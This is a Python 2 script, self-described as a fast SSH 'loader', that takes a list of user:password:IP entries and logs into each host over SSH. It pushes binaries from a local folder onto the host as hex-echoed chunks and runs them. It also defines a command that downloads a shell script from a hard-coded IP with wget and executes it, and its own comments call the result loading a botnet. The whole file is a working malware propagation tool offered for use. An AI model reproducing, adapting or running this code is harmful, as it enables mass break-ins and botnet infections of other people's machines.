#!/usr/bin/python
#Phaaaat hax SSH loader by Freak AKA Milenko

import sys, re, os, paramiko, socket
from threading import Thread
from time import sleep

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")

paramiko.util.log_to_file("/dev/null")
rekdevice="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.210.163.201/imightbegay.sh -O imightbegay.sh; busybox wget http://192.210.163.201/imightbegay.sh -O imightbegay.sh; chmod 777 imightbegay.sh; ./imightbegay.sh; rm -rf imightbegay.sh" #command to send
print "\033[31m"

print "S-S-SUUUPER fast SSH loader by Milenko"
print
#simply find and replace newlines to :: then a newline so every IP starts with ::. It will scan those for port 22 or whatever your skiddie heart desires </3
print "Reads user:pass:ip and simply checks the IP for port 22."
print "Then writes loads the bonet onto it and saves the logins with SSH running to \"sshopen.txt\""
print "It is VERY fast and extremely efficient."
print "As it splits the file into equal chunks for each thread!"

threads = int(raw_input("Threads: "))

lines = open(sys.argv[1],"r").readlines()

fh = open("sshopen.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]

running = 0

loaded = 0

def printStatus():
    while 1:
        sleep(10)
        print "\033[32m[\033[31m+\033[32m] Total eye pees loaded: " + str(loaded) + "\033[37m"
        if loaded >= 1000:
            print "Dayum u got sum phat hax brah :^}"

def split_utf8(s , n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        while '\x80' <= s[end] <= '\xBF':
            end -= 1
        assert end > start
        yield s[start:end]
        start = end

def haxit(username,password,ip):
    try:
        port = 22
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port = port, username=username, password=password, timeout=3)
        print "\033[32m[\033[31m+\033[32m] Echoloading: " + ip + "\033[37m"
        ssh.exec_command("cd /tmp")
        for file in os.listdir("bins"):
            f=open("bins/" + file,"rb")
            for hex in split_utf8(f.read(), 10240):
               ssh.exec_command("echo -ne " + ''.join(map(lambda c:'\\\\x%02x'%c, map(ord, hex))) + " >> " + file)
               ssh.exec_command("/bin/echo -ne " + ''.join(map(lambda c:'\\\\x%02x'%c, map(ord, hex))) + " >> " + file + "1")
            ssh.exec_command("chmod 777 " + file)
            ssh.exec_command("/bin/busybox chmod 777 " + file + "1")
            ssh.exec_command("./" + file)
            ssh.exec_command("./" + file + "1")
            ssh.exec_command("./WXeAYfXKuzViKw")
        print "\033[32m[\033[31m+\033[32m] ECHOLOADED: " + ip + "\033[37m"
        sleep(10)
        loaded += 1
        ssh.close()
    except Exception as e:
        print str(e)
        pass

def check(chunk, fh):
    global running
    running += 1
    threadID = running
    for login in chunk:
        if login.startswith("DUP"):
            continue # skip DUPS cause fuck em

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((login.split(":")[2], 22))
            s.close()
            print "\033[32m[\033[31m+\033[32m] " + login + " has SSH open. Loading..."
            haxit(login.split(":")[0], login.split(":")[1], login.split(":")[2])
            fh.write(login + "\r\n")
            fh.flush()
        except:
            pass
    print "\033[32m[\033[31m+\033[32m] Thread " + str(threadID) + " has finished scanning " + str(len(chunk)) + " IPs. Loaded: " + str(loaded)
    running -= 1

lines = map(lambda s: s.strip(), lines) # remove all newlines

chunks = chunkify(lines, threads) # make seperate chunk for each thread

print "STARTING SCAN AND LOAD!!!"

Thread(target = printStatus, args = ()).start()

for thread in xrange(0,threads):
    if thread >= 384:
        time.sleep(0.2)
    try:
        Thread(target = check, args = (chunks[thread], fh,)).start()
    except:
        pass
print "Scanning... Press enter 3 times to stop."

for i in range(0,3):
    raw_input()

fh.close()

os.kill(os.getpid(),9)
